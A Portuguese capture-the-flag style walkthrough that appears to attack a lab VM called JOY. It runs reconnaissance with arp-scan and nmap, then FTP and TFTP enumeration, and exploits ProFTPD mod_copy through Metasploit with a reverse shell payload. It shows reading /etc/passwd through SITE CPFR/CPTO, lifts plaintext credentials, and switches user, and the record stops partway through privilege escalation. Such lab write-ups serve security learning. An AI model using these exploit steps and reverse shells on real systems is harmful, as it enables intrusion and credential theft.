# Host discovery

Preciso saber o ip da máquina. Sendo assim, preciso fazer um arp-scan na rede.

```bash
──(kali㉿kali)-[~]
└─$ sudo arp-scan --interface=eth1 192.168.56.0/24
[sudo] password for kali: 
Interface: eth1, type: EN10MB, MAC: 08:00:27:fa:3b:5d, IPv4: 192.168.56.1
WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied
WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.56.14   08:00:27:00:d0:70       (Unknown)

2 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.017 seconds (126.92 hosts/sec). 1 responded

```

# Information gathering

No navegador, fui em http://192.168.56.14 e concluí que a máquina roda um HIDS (Host-based Intrusion Detection System) chamado OSSEC na versão 0.8.

Esse serviço possui uma CVE que permite lfi. Tentei alguns entry points, mas não consegui nada. Parece estar mitigado.

# Enumeration

Primeiramente, vou rodar um nmap para saber os serviços que estão rodando na máquina

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap -Pn -sV 192.168.56.14               
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-12 12:54 EDT
Nmap scan report for 192.168.56.14
Host is up (0.0017s latency).
Not shown: 988 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         ProFTPD 1.2.10
22/tcp  open  ssh         Dropbear sshd 0.34 (protocol 2.0)
25/tcp  open  smtp        Postfix smtpd
80/tcp  open  http        Apache httpd 2.4.25 ((Debian))
110/tcp open  pop3        Dovecot pop3d
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
465/tcp open  smtp        Postfix smtpd
587/tcp open  smtp        Postfix smtpd
993/tcp open  ssl/imap    Dovecot imapd
995/tcp open  ssl/pop3    Dovecot pop3d
MAC Address: 08:00:27:00:D0:70 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: Hosts: The,  JOY.localdomain, JOY; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.81 seconds

```

Verifiquei que ele roda um ProFTPD 1.2.10. Tentei procurar algum exploit, mas não encontrei.

Mas vou tentar conectar ao ftp com anonymous.

```bash
┌──(kali㉿kali)-[~]
└─$ ftp 192.168.56.14
Connected to 192.168.56.14.
220 The Good Tech Inc. FTP Server
Name (192.168.56.14:kali): anonymous
331 Anonymous login ok, send your complete email address as your password
Password: 
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

Ok. Agora que consegui, vou tentar listar o que tem no diretório:

```bash
ftp> ls
229 Entering Extended Passive Mode (|||1171|)
150 Opening ASCII mode data connection for file list
drwxrwxr-x   2 ftp      ftp          4096 Jan  6  2019 download
drwxrwxr-x   2 ftp      ftp          4096 Jan 10  2019 upload
226 Transfer complete
ftp> 
```

Aqui, temos dois diretórios: download e upload. Em download não tinha nada, mas em upload tinha algumas coisas:

```bash
ftp> cd upload
250 CWD command successful
ftp> ls
229 Entering Extended Passive Mode (|||1849|)
150 Opening ASCII mode data connection for file list
-rwxrwxr-x   1 ftp      ftp          6150 Jul 12 18:42 directory
-rw-rw-rw-   1 ftp      ftp             0 Jan  6  2019 project_armadillo
-rw-rw-rw-   1 ftp      ftp            25 Jan  6  2019 project_bravado
-rw-rw-rw-   1 ftp      ftp            88 Jan  6  2019 project_desperado
-rw-rw-rw-   1 ftp      ftp             0 Jan  6  2019 project_emilio
-rw-rw-rw-   1 ftp      ftp             0 Jan  6  2019 project_flamingo
-rw-rw-rw-   1 ftp      ftp             7 Jan  6  2019 project_indigo
-rw-rw-rw-   1 ftp      ftp             0 Jan  6  2019 project_komodo
-rw-rw-rw-   1 ftp      ftp             0 Jan  6  2019 project_luyano
-rw-rw-rw-   1 ftp      ftp             8 Jan  6  2019 project_malindo
-rw-rw-rw-   1 ftp      ftp             0 Jan  6  2019 project_okacho
-rw-rw-rw-   1 ftp      ftp             0 Jan  6  2019 project_polento
-rw-rw-rw-   1 ftp      ftp            20 Jan  6  2019 project_ronaldinho
-rw-rw-rw-   1 ftp      ftp            55 Jan  6  2019 project_sicko
-rw-rw-rw-   1 ftp      ftp            57 Jan  6  2019 project_toto
-rw-rw-rw-   1 ftp      ftp             5 Jan  6  2019 project_uno
-rw-rw-rw-   1 ftp      ftp             9 Jan  6  2019 project_vivino
-rw-rw-rw-   1 ftp      ftp             0 Jan  6  2019 project_woranto
-rw-rw-rw-   1 ftp      ftp            20 Jan  6  2019 project_yolo
-rw-rw-rw-   1 ftp      ftp           180 Jan  6  2019 project_zoo
-rwxrwxr-x   1 ftp      ftp            24 Jan  6  2019 reminder
226 Transfer complete
ftp>
```

Feito isso, vou "puxar" tudo pra minha máquina:

```bash
ftp> mget directory reminder project_*
mget directory [anpqy?]? 
229 Entering Extended Passive Mode (|||5143|)
150 Opening BINARY mode data connection for directory (6150 bytes)
100% |********************************|  6150       48.07 MiB/s    00:00 ETA
...
```

Quando eu dou um cat em directory, eu posso ver o conteúdo do diretório do usuário patrick

```bash
┌──(kali㉿kali)-[~]
└─$ cat directory   
Patrick's Directory

total 192
drwxr-xr-x 18 patrick patrick 4096 Jul 13 02:40 .
drwxr-xr-x  4 root    root    4096 Jan  6  2019 ..
-rw-r--r--  1 patrick patrick    0 Jul 13 01:50 04TflRb8pmOvnyn46XKj5Eovu1Zic4oE.txt
-rw-r--r--  1 patrick patrick   24 Jul 13 01:00 0LsqHbTTKDYqENAE2N5Yq90tcKAvRidB7xQCkML9NQiVWPCzPFrKoDMaDfW3yhW5.txt
-rw-r--r--  1 patrick patrick   24 Jul 13 02:15 2IRPUQPAKOZotvIEzrFid9SCQdQT8MgxaeSwatTk39AMa26qwvbxAa28azL2dVSg.txt
-rw-r--r--  1 patrick patrick   24 Jul 13 01:50 3dXR5FH1WHi0qJunsfMH4CwyVB5dLEaQwgnl4OGkh9nsy0M3FHsBFsSDsC1wSG61.txt
-rw-r--r--  1 patrick patrick   24 Jul 13 01:30 3ttBAhT7c7cFh8JqrY852PYnzQmRaxano6v76VSdlicqFB1LPgTFq2ZL3mUJ2zCj.txt
-rw-r--r--  1 patrick patrick   24 Jul 13 01:20 4B0pr8GNrNxW0o6FPQMiX45HXSczAaNDkN65W1VMFNzgMI86w3u7jrTRBLl5Ez9N.txt
-rw-r--r--  1 patrick patrick   24 Jul 13 02:30 4dW8nVj2CmJorjgHb4VDR21ANTLQMCaqHjBZcytmeXyrBx9TEUSbUSnIDRmoDhyY.txt
-rw-r--r--  1 patrick patrick    0 Jul 13 02:40 5GIWeBahxyDegYbCqDUwSUbVaQREnZ5t.txt
-rw-r--r--  1 patrick patrick    0 Jul 13 00:55 5p7ofU73xl3Qbi1DVhB2jb2PBcOsDy0N.txt
-rw-r--r--  1 patrick patrick    0 Jul 13 01:10 8gvntWcvmuUQGwcTTpXXekVvEZ7qy3t8.txt
-rw-r--r--  1 patrick patrick    0 Jul 13 01:30 aVXWukGXpSBLmiEYZxPx7fchOVYIgsQ1.txt
-rw-r--r--  1 patrick patrick   24 Jul 13 02:25 AZqMxtbvTyqjQcICoe4KP6ySVdKxglesJzz5lhz8AINXKt6XlfnYy6JRW5eOV0YF.txt
-rw-------  1 patrick patrick  185 Jan 28  2019 .bash_history
-rw-r--r--  1 patrick patrick  220 Dec 23  2018 .bash_logout
-rw-r--r--  1 patrick patrick 3526 Dec 23  2018 .bashrc
drwx------  7 patrick patrick 4096 Jan 10  2019 .cache
drwx------ 10 patrick patrick 4096 Dec 26  2018 .config
drwxr-xr-x  2 patrick patrick 4096 Dec 26  2018 Desktop
drwxr-xr-x  2 patrick patrick 4096 Dec 26  2018 Documents
drwxr-xr-x  3 patrick patrick 4096 Jan  6  2019 Downloads
-rw-r--r--  1 patrick patrick    0 Jul 13 01:15 EwMNMDxXgDJhxl5jwhMd6Edv3CmszeXL.txt
-rw-r--r--  1 patrick patrick    0 Jul 13 01:20 eYc6DnPj4OoXUc22T23RV5Wj28qnJcfc.txt
-rw-r--r--  1 patrick patrick    0 Jul 13 02:00 F6SHIEhgLa51gRgId599Fp92ff9kWmbR.txt
-rw-r--r--  1 patrick patrick    0 Jul 13 01:55 gIgkM5zzfHtWGsontmZJQWj4QFfaNzVn.txt
drwx------  3 patrick patrick 4096 Dec 26  2018 .gnupg
-rw-r--r--  1 patrick patrick    0 Jul 13 01:25 gNz3oeKbeiK1NFQB3HsOcf5fp4j2GQEW.txt
-rwxrwxrwx  1 patrick patrick    0 Jan  9  2019 haha
-rw-r--r--  1 patrick patrick   24 Jul 13 01:45 hXFBGrULW1GaEzEkLcyk6ItEQo7Ut009B6dWwuW2QM8F2b8Y3HeAUy3z2HX9Xf1V.txt
-rw-r--r--  1 patrick patrick    0 Jul 13 02:30 hXI814pXuZBfWDa5qkaeDUTKzpqTm26A.txt
-rw-------  1 patrick patrick 8532 Jan 28  2019 .ICEauthority
-rw-r--r--  1 patrick patrick   24 Jul 13 01:55 idf7AYd0XJY08fyTAYxHSFy6b5GdHySWvRapc3gRa7AM5zLYGc8pKLcA3tXvWT3i.txt
-rw-r--r--  1 patrick patrick   24 Jul 13 00:55 IuotXD4hMBnDMTlyWJuuqMgCkOjga1mv90BSrngnRInrRAjR1GR8osVbx3n4Qscx.txt
-rw-r--r--  1 patrick patrick   24 Jul 13 01:25 jHbkzVnrFNGMpciuk0DtA83l26tHrVRCoz4153Po2X04och3w1RWB0mMSa6UAIHZ.txt
-rw-r--r--  1 patrick patrick   24 Jul 13 01:15 JZylzCc3ALvLDe6vHNr4cC3I39p2eBSf1zhYoaIrbp0aqEfEqf4SqTFfdUTXOXyD.txt
-rw-r--r--  1 patrick patrick   24 Jul 13 02:35 K4F8SmniXvElVhCsi9yqIweemcizH9UAVYFrntHIZ4NPjQ8iXLlNWQQO5feDmzKK.txt
-rw-r--r--  1 patrick patrick    0 Jul 13 01:35 kJFnhdRHuqwU22b1GTK0JwnfV5ID8SFH.txt
-rw-r--r--  1 patrick patrick    0 Jul 13 02:05 KKld5IH8LHftCxKzNBAe3REm56M7Ql94.txt
-rw-r--r--  1 patrick patrick    0 Jul 13 01:00 kLNjdexPu7Eom3anHp2rDmqsvrPAtoQs.txt
-rw-r--r--  1 patrick patrick    0 Jul 13 02:35 kTRinNxEvhwkoXdyArSjvMR9xPuGUJN8.txt
drwxr-xr-x  3 patrick patrick 4096 Dec 26  2018 .local
-rw-r--r--  1 patrick patrick   24 Jul 13 02:00 lrFyN6nAqo41QQZeTxYplPvhvcy7ZtllvrlJRUT5VqLs6P7os0qTUVNoEKcODU3J.txt
-rw-r--r--  1 patrick patrick   24 Jul 13 02:05 ModaNi1y7CU5LAo2EHKZPaLeWuyds6AodRDp2OHRgOF6nksX3jzQDjpgwffvtnFS.txt
drwx------  5 patrick patrick 4096 Dec 28  2018 .mozilla
drwxr-xr-x  2 patrick patrick 4096 Dec 26  2018 Music
drwxr-xr-x  2 patrick patrick 4096 Jan  8  2019 .nano
drwxr-xr-x  2 patrick patrick 4096 Dec 26  2018 Pictures
-rw-r--r--  1 patrick patrick  675 Dec 23  2018 .profile
-rw-r--r--  1 patrick patrick   24 Jul 13 02:40 pSPVyrRAwQqlFZdvtqCWJQjdeB9vGNz0MyOlDaxhr1bnwJhc98yP419mrhocTuxF.txt
drwxr-xr-x  2 patrick patrick 4096 Dec 26  2018 Public
-rw-r--r--  1 patrick patrick   24 Jul 13 01:40 QEGfrxSHS5NMQgdMmW7Mce0k2ilt43JHCSmX2YED0AybrrDogqSp4awUos914dPZ.txt
-rw-r--r--  1 patrick patrick    0 Jul 13 02:10 qh7ckPnVaHEqQi8k4FYJcXZrFXj7NCZy.txt
-rw-r--r--  1 patrick patrick    0 Jul 13 01:40 QpQC66TCVaSnzwk6ZwJhoWhv45B68iY4.txt
d---------  2 root    root    4096 Jan  9  2019 script
drwx------  2 patrick patrick 4096 Dec 26  2018 .ssh
-rw-r--r--  1 patrick patrick    0 Jan  6  2019 Sun
drwxr-xr-x  2 patrick patrick 4096 Dec 26  2018 Templates
-rw-r--r--  1 patrick patrick    0 Jan  6  2019 .txt
-rw-r--r--  1 patrick patrick    0 Jul 13 02:15 ue1Y5gbizfO9dzvysuTrLJRZeLLOcP2l.txt
-rw-r--r--  1 patrick patrick   24 Jul 13 01:05 uWTNjar36FCqrF2h83ldlwSrUjrOj4qdeDyG0WwxSPE0nnhuMfl7upfEXpnzZLSU.txt
-rw-r--r--  1 patrick patrick  407 Jan 27  2019 version_control
-rw-r--r--  1 patrick patrick   24 Jul 13 01:35 VHXNo7w0JuGSo9HoUsyUpnlrst0TkOGQ1NRCxPbZsl7rF6wzIC0rOp63Ob3YzTiO.txt
drwxr-xr-x  2 patrick patrick 4096 Dec 26  2018 Videos
-rw-r--r--  1 patrick patrick    0 Jul 13 02:20 Wf2yL8BWuYFG168ZHJlP31P34JcenyJr.txt
-rw-r--r--  1 patrick patrick    0 Jul 13 01:05 wQ4aboIxxPsyBCnLtGsbzRF7mvOcLSG3.txt
-rw-r--r--  1 patrick patrick   24 Jul 13 02:20 wYhgMEMMon9Pcd5hSN7ucCqrTWuapKIHLfLR0lNWajiem08FaudymiDCIFM054Mw.txt
-rw-r--r--  1 patrick patrick   24 Jul 13 01:10 xURTrWMrRRGB5qKuWGTCFAlTHejeFX9nyYbOJsYBNpOMwDxtPdiKUBopr9LJX9SI.txt
-rw-r--r--  1 patrick patrick    0 Jul 13 01:45 YW6KnhOb7pHKw1K0ELa6ybwDyqesHYpN.txt
-rw-r--r--  1 patrick patrick   24 Jul 13 02:10 ZajX17xerpk4Ab8vdHHbGIWsU1tH9DJdzfRWky62OoB0YHeNvFcU7QMjwJceMf9J.txt
-rw-r--r--  1 patrick patrick    0 Jul 13 02:25 Ztp7Kl7Ud4Vmfl5ddbzHaSHPe6RPc22o.txt

You should know where the directory can be accessed.

Information of this Machine!

Linux JOY 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64 GNU/Linux
                                
```

O diretório dele tem muitos arquivos e a maioria não parece ter muito significado. Mas dois me chamaram a atenção: script e version_control.

Chegamos a um beco sem saída, pois o acesso a esse servidor ftp é extremamente limitado.

Vamos checar os demais serviços que estão rodando na máquina.

Temos um servidor smtp, samba...

Enumerando o smb, nos deparamos com dois diretórios compartilhados: print e IPC, mas não é possível acessá-los. (permissão negada)

```bash
┌──(kali㉿kali)-[~]
└─$ smbclient -L //192.168.56.14 -N

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        IPC$            IPC       IPC Service (Samba 4.5.12-Debian)
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            JOY

```



Vou rodar de novo o nmap pegando as top ports

```bash
──(kali㉿kali)-[~]
└─$ sudo nmap -sU --top-ports 50 -sV -sC 192.168.56.14
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-12 15:06 EDT
Nmap scan report for 192.168.56.14
Host is up (0.0024s latency).
Not shown: 42 closed udp ports (port-unreach)
PORT     STATE         SERVICE     VERSION
68/udp   open|filtered dhcpc
123/udp  open          ntp         NTP v4 (unsynchronized)
| ntp-info: 
|_  
137/udp  open          netbios-ns  Samba nmbd netbios-ns (workgroup: WORKGROUP)
| nbns-interfaces: 
|   hostname: JOY
|   interfaces: 
|_    192.168.56.14
...
...
|   550: 
|     Name: mysqld
|     Path: /usr/sbin/mysqld
|   575: 
|     Name: apache2
|     Path: /usr/sbin/apache2
|     Params: -k start
|   685: 
|     Name: minissdpd
|     Path: /usr/sbin/minissdpd
|     Params: -i 0.0.0.0
|   691: 
|     Name: in.tftpd
|     Path: /usr/sbin/in.tftpd
|     Params: --listen --user tftp --address 0.0.0.0:36969 --secure /home/patrick

```

Interessante... tem um outro servidor ftp rodando... é um servidor simples tftp. E o diretório dele é o /home/patrick. O que significa que vou poder pegar os arquivos que me interessaram anteriormente. Vou tentar conexão com ele.

```bash
┌──(kali㉿kali)-[~]
└─$ tftp 192.168.56.14 36969
tftp> ls
?Invalid command
tftp> get version_control
tftp> get script
Error code 0: Permission denied
tftp> quit

```

Maravilha... peguei o version_control e tentei pegar script, mas não consegui.
Vou tentar ler version_control.

```bash
┌──(kali㉿kali)-[~]
└─$ cat version_control 
Version Control of External-Facing Services:

Apache: 2.4.25
Dropbear SSH: 0.34
ProFTPd: 1.3.5
Samba: 4.5.12

We should switch to OpenSSH and upgrade ProFTPd.

Note that we have some other configurations in this machine.
1. The webroot is no longer /var/www/html. We have changed it to /var/www/tryingharderisjoy.
2. I am trying to perform some simple bash scripting tutorials. Let me see how it turns out.

```

Legal, ele deu a versão do proftp e algumas anotações.
Disse que o webroot mudou do padrão /var/www/html para /var/www/tryingharderisjoy.

Agora que já temos a versão do proftpd, vamos tentar um exploit.

# Gaining access

```bash
msf6 exploit(linux/ftp/proftp_sreplace) > search proftpd

Matching Modules
================

   #   Name                                                                 Disclosure Date  Rank       Check  Description
   -   ----                                                                 ---------------  ----       -----  -----------
   0   exploit/linux/misc/netsupport_manager_agent                          2011-01-08       average    No     NetSupport Manager Agent Remote Buffer Overflow
   1   exploit/linux/ftp/proftp_sreplace                                    2006-11-26       great      Yes    ProFTPD 1.2 - 1.3.0 sreplace Buffer Overflow (Linux)
   2     \_ target: Automatic Targeting                                     .                .          .      .
   3     \_ target: Debug                                                   .                .          .      .
   4     \_ target: ProFTPD 1.3.0 (source install) / Debian 3.1             .                .          .      .
   5   exploit/freebsd/ftp/proftp_telnet_iac                                2010-11-01       great      Yes    ProFTPD 1.3.2rc3 - 1.3.3b Telnet IAC Buffer Overflow (FreeBSD)
   6     \_ target: Automatic Targeting                                     .                .          .      .
   7     \_ target: Debug                                                   .                .          .      .
   8     \_ target: ProFTPD 1.3.2a Server (FreeBSD 8.0)                     .                .          .      .
   9   exploit/linux/ftp/proftp_telnet_iac                                  2010-11-01       great      Yes    ProFTPD 1.3.2rc3 - 1.3.3b Telnet IAC Buffer Overflow (Linux)
   10    \_ target: Automatic Targeting                                     .                .          .      .
   11    \_ target: Debug                                                   .                .          .      .
   12    \_ target: ProFTPD 1.3.3a Server (Debian) - Squeeze Beta1          .                .          .      .
   13    \_ target: ProFTPD 1_3_3a Server (Debian) - Squeeze Beta1 (Debug)  .                .          .      .
   14    \_ target: ProFTPD 1.3.2c Server (Ubuntu 10.04)                    .                .          .      .
   15  exploit/unix/ftp/proftpd_modcopy_exec                                2015-04-22       excellent  Yes    ProFTPD 1.3.5 Mod_Copy Command Execution
   16  exploit/unix/ftp/proftpd_133c_backdoor                               2010-12-02       excellent  No     ProFTPD-1.3.3c Backdoor Command Execution


Interact with a module by name or index. For example info 16, use 16 or use exploit/unix/ftp/proftpd_133c_backdoor                                        

msf6 exploit(linux/ftp/proftp_sreplace)
```

Ok. Temos uma oção para a versão 1.3.5:
**/unix/ftp/proftpd_modcopy_exec**

O modcopy é um módulo opcional do proftpd que, quanto ativo, nos permite copiar arquivos dentro do servidor FTP sem autenticação (a depender da configuração)

Se o servidor estiver com o módulo modcopy habilitado e mal configurado (ex: sem restrições de diretórios), ele pode permitir:

**Leitura arbitrária de arquivos (SITE CPFR)**
**Escrita arbitrária de arquivos (SITE CPTO)**

## Como funciona o ataque mod_copy

São dois comandos especiais:

SITE CPFR [origem]     "copy from" (especifica o arquivo de origem)
SITE CPTO [destino]    "copy to" (especifica o destino da cópia)

### Exemplo de exploit:

Nos conectamos via FTP (com ou sem autenticação, dependendo da configuração), e executamos:

SITE CPFR /etc/passwd
SITE CPTO /var/www/html/passwd.txt

Depois, podemos acessar via navegador

http://target.com/passwd.txt

### Como saber se está habilitado

Basta conectar via ftp e tentar

```bash
ftp target.com
Name: anonymous
Password: anonymous

ftp> SITE CPFR /etc/passwd
```

Se não der erro ou retornar uma mensagem de sucesso, provavelmente está habilitado.



## Continuando o nosso exploit

Muito bem, agora que sabemos qual exploit usar, vamos escolher e incluir os parâmetros.

```bash
msf6 exploit(linux/ftp/proftp_sreplace) > use 15
[*] No payload configured, defaulting to cmd/unix/reverse_netcat
msf6 exploit(unix/ftp/proftpd_modcopy_exec) > show options

Module options (exploit/unix/ftp/proftpd_modcopy_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   CHOST                       no        The local client address
   CPORT                       no        The local client port
   Proxies                     no        A proxy chain of format type:host:
                                         port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://do
                                         cs.metasploit.com/docs/using-metas
                                         ploit/basics/using-metasploit.html
   RPORT      80               yes       HTTP port (TCP)
   RPORT_FTP  21               yes       FTP port
   SITEPATH   /var/www         yes       Absolute writable website path
   SSL        false            no        Negotiate SSL/TLS for outgoing con
                                         nections
   TARGETURI  /                yes       Base path to the website
   TMPPATH    /tmp             yes       Absolute writable path
   VHOST                       no        HTTP server virtual host


Payload options (cmd/unix/reverse_netcat):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.15.7     yes       The listen address (an interface may b
                                     e specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   ProFTPD 1.3.5



View the full module info with the info, or info -d command.

```

Precisamos incluir o RHOSTS e alterar o SITEPATH, pois lembra que o caminho do site não é /var/www? É **/var/www/tryingharderisjoy**. Além disso, preciso alterar o LHOST para 192.168.56.1.

```bash
msf6 exploit(unix/ftp/proftpd_modcopy_exec) > set LHOST 192.168.56.1
LHOST => 192.168.56.1
msf6 exploit(unix/ftp/proftpd_modcopy_exec) > set RHOSTS 192.168.56.14
RHOSTS => 192.168.56.14

```

```bash
msf6 exploit(unix/ftp/proftpd_modcopy_exec) > set SITEPATH /var/www/tryingharderisjoy
SITEPATH => /var/www/tryingharderisjoy

```

Tive que trocar o payload

```bash
msf6 exploit(unix/ftp/proftpd_modcopy_exec) > set payload /cmd/unix/reverse_python
payload => cmd/unix/reverse_python

```

Rodo o exploit

```bash
msf6 exploit(unix/ftp/proftpd_modcopy_exec) > exploit
[*] Started reverse TCP handler on 192.168.56.1:4444 
[*] 192.168.56.14:80 - 192.168.56.14:21 - Connected to FTP server
[*] 192.168.56.14:80 - 192.168.56.14:21 - Sending copy commands to FTP server
[*] 192.168.56.14:80 - Executing PHP payload /h22mg9k.php
[+] 192.168.56.14:80 - Deleted /var/www/tryingharderisjoy/h22mg9k.php
[*] Command shell session 1 opened (192.168.56.1:4444 -> 192.168.56.14:36456) at 2025-07-12 15:28:34 -0400

ls
8QBrRF.php
Crzupsh.php
UdkfS.php
i8EUshu.php
lRSIICs.php
ossec
whoami   
www-data

```

Estamos logados com o usuário www-data. Precisamos de algo que nos dê a oportunidade de escalar privilégio. Vou ver o que tem no diretório **ossec**.

```bash
ls -la ossec
total 116
drwxr-xr-x 8 www-data www-data  4096 Jan  6  2019 .
drwxr-xr-x 3 www-data www-data  4096 Jul 13 03:28 ..
-rw-r--r-- 1 www-data www-data    92 Jul 19  2016 .hgtags
-rw-r--r-- 1 www-data www-data   262 Dec 28  2018 .htaccess
-rw-r--r-- 1 www-data www-data    44 Dec 28  2018 .htpasswd
-rwxr-xr-x 1 www-data www-data   317 Jul 19  2016 CONTRIB
-rw-r--r-- 1 www-data www-data 35745 Jul 19  2016 LICENSE
-rw-r--r-- 1 www-data www-data  2106 Jul 19  2016 README
-rw-r--r-- 1 www-data www-data   923 Jul 19  2016 README.search
drwxr-xr-x 3 www-data www-data  4096 Jul 19  2016 css
-rw-r--r-- 1 www-data www-data   218 Jul 19  2016 htaccess_def.txt
drwxr-xr-x 2 www-data www-data  4096 Jul 19  2016 img
-rwxr-xr-x 1 www-data www-data  5177 Jul 19  2016 index.php
drwxr-xr-x 2 www-data www-data  4096 Jul 19  2016 js
drwxr-xr-x 3 www-data www-data  4096 Dec 28  2018 lib
-rw-r--r-- 1 www-data www-data   462 Jul 19  2016 ossec_conf.php
-rw-r--r-- 1 www-data www-data   134 Jan  6  2019 patricksecretsofjoy
-rwxr-xr-x 1 www-data www-data  2471 Jul 19  2016 setup.sh
drwxr-xr-x 2 www-data www-data  4096 Dec 28  2018 site
drwxrwxrwx 2 www-data www-data  4096 Jul 13 02:37 tmp

```

Tem um arquivo do usuário patrick provavelmente: patricksecretsofjoy

```bash
cat ossec/patricksecretsofjoy
credentials for JOY:
patrick:apollo098765
root:howtheheckdoiknowwhattherootpasswordis

how would these hack3rs ever find such a page?
```

Muito bom... provavelmente a senha do patrick e de root.
Vamos tentar...

```bash
su root
su: must be run from a terminal
```

Opa! Precisamos ter um terminal... faremos isso com python

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@JOY:/var/www/tryingharderisjoy$

```

Agora, tentamos de novo:

```bash
www-data@JOY:/var/www/tryingharderisjoy$ su root
su root
Password: howtheheckdoiknowwhattherootpasswordis

su: Authentication failure

```

Tentamos a senha do root, mas sem sucesso. Vamos tentar com o usuário patrick...

```bash
www-data@JOY:/var/www/tryingharderisjoy$ su patrick
su patrick
Password: apollo098765

patrick@JOY:/var/www/tryingharderisjoy$
```

Muito bom. Conseguimos nos mover. Agora, é tentar o shell de root.

```bash
patrick@JOY:/var/www/tryingharderisjoy$ ls -la /home/patrick
ls -la /home/patrick
total 244
drwxr-xr-x 18 patrick patrick 12288 Jul 13 03:35 .
drwxr-xr-x  4 root    root     4096 Jan  6  2019 ..
-rw-r--r--  1 patrick patrick     0 Jul 13 01:50 04TflRb8pmOvnyn46XKj5Eovu1Zic4oE.txt
-rw-r--r--  1 patrick patrick    24 Jul 13 01:00 0LsqHbTTKDYqENAE2N5Yq90tcKAvRidB7xQCkML9NQiVWPCzPFrKoDMaDfW3yhW5.txt
-rw-r--r--  1 patrick patrick    24 Jul 13 02:15 2IRPUQPAKOZotvIEzrFid9SCQdQT8MgxaeSwatTk39AMa26qwvbxAa28azL2dVSg.txt
-rw-r--r--  1 patrick patrick    24 Jul 13 01:50 3dXR5FH1WHi0qJunsfMH4CwyVB5dLEaQwgnl4OGkh9nsy0M3FHsBFsSDsC1wSG61.txt
-rw-r--r--  1 patrick patrick    24 Jul 13 01:30 3ttBAhT7c7cFh8JqrY852PYnzQmRaxano6v76VSdlicqFB1LPgTFq2ZL3mUJ2zCj.txt
-rw-r--r--  1 patrick patrick    24 Jul 13 01:20 4B0pr8GNrNxW0o6FPQMiX45HXSczAaNDkN65W1VMFNzgMI86w3u7jrTRBLl5Ez9N.txt
-rw-r--r--  1 patrick patrick    24 Jul 13 02:30 4dW8nVj2CmJorjgHb4VDR21ANTLQMCaqHjBZcytmeXyrBx9TEUSbUSnIDRmoDhyY.txt
-rw-r--r--  1 patrick patrick     0 Jul 13 02:55 5GcJ39kLG223v3Kh271bmT2yro574aWq.txt
-rw-r--r--  1 patrick patrick     0 Jul 13 02:40 5GIWeBahxyDegYbCqDUwSUbVaQREnZ5t.txt
-rw-r--r--  1 patrick patrick     0 Jul 13 00:55 5p7ofU73xl3Qbi1DVhB2jb2PBcOsDy0N.txt
-rw-r--r--  1 patrick patrick     0 Jul 13 01:10 8gvntWcvmuUQGwcTTpXXekVvEZ7qy3t8.txt
-rw-r--r--  1 patrick patrick    24 Jul 13 02:45 9eXziBy3QjRmjFrXh6un8Lzdy9KnD3zJl6QVQzGHcbNwHZUmsnoA5lQL87rrMHqD.txt
-rw-r--r--  1 patrick patrick     0 Jul 13 03:30 aDmGDVdKPHKOif7cdg1jxNXAIqWTBLBM.txt
-rw-r--r--  1 patrick patrick     0 Jul 13 01:30 aVXWukGXpSBLmiEYZxPx7fchOVYIgsQ1.txt
-rw-r--r--  1 patrick patrick    24 Jul 13 02:25 AZqMxtbvTyqjQcICoe4KP6ySVdKxglesJzz5lhz8AINXKt6XlfnYy6JRW5eOV0YF.txt
-rw-------  1 patrick patrick   185 Jan 28  2019 .bash_history
-rw-r--r--  1 patrick patrick   220 Dec 23  2018 .bash_logout
-rw-r--r--  1 patrick patrick  3526 Dec 23  2018 .bashrc
drwx------  7 patrick patrick  4096 Jan 10  2019 .cache
drwx------ 10 patrick patrick  4096 Dec 26  2018 .config
drwxr-xr-x  2 patrick patrick  4096 Dec 26  2018 Desktop
drwxr-xr-x  2 patrick patrick  4096 Dec 26  2018 Documents
drwxr-xr-x  3 patrick patrick  4096 Jan  6  2019 Downloads
-rw-r--r--  1 patrick patrick     0 Jul 13 03:10 e9Tekw2xTKHmLoJVfLybl6HGgheBxu39.txt
-rw-r--r--  1 patrick patrick     0 Jul 13 01:15 EwMNMDxXgDJhxl5jwhMd6Edv3CmszeXL.txt
-rw-r--r--  1 patrick patrick     0 Jul 13 01:20 eYc6DnPj4OoXUc22T23RV5Wj28qnJcfc.txt
-rw-r--r--  1 patrick patrick     0 Jul 13 02:00 F6SHIEhgLa51gRgId599Fp92ff9kWmbR.txt
-rw-r--r--  1 patrick patrick     0 Jul 13 01:55 gIgkM5zzfHtWGsontmZJQWj4QFfaNzVn.txt
drwx------  3 patrick patrick  4096 Dec 26  2018 .gnupg
-rw-r--r--  1 patrick patrick     0 Jul 13 01:25 gNz3oeKbeiK1NFQB3HsOcf5fp4j2GQEW.txt
-rw-r--r--  1 patrick patrick    24 Jul 13 03:15 gVXThWEDQoMjmAQ9LIM7Ocd4iGAJt54tqe0Ljv475IfEFs8tTGtJ5RtpWFgPyBOl.txt
